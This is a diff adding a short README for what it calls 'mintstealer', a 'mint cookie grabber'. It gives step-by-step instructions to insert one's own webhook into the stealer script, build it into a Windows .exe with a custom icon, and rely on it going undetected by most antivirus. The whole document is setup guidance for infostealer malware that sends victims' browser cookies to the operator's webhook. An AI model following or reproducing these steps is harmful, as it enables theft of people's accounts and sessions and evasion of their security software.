@@ -1,0 +1,12 @@
+MAKE SURE YOU HAVE PYTHON 3.11 OR 3.12 (best version it works on is 3.12)
+DOWNLOAD PYTHON AT: https://www.python.org/downloads/
+
+Instructions:
+1. Make sure you have correct python version downloaded, link at top.
+3. Run install.bat and wait for everything to download.
+2. Change the %WEBHOOKHERE% to your webhook in the last line of mintstealer.py (dont remove the "")
+3. Run the builder.bat file. if you want a version with a changed icon of the .exe add a .ico file named "ico" in the mint cookie grabber folder and open builder (with ico).bat
+4. After building go into the dist folder
+5. You should have your undetected .exe grabber CONGRATS
+
+Some anti-virus might still detect it but most wont.
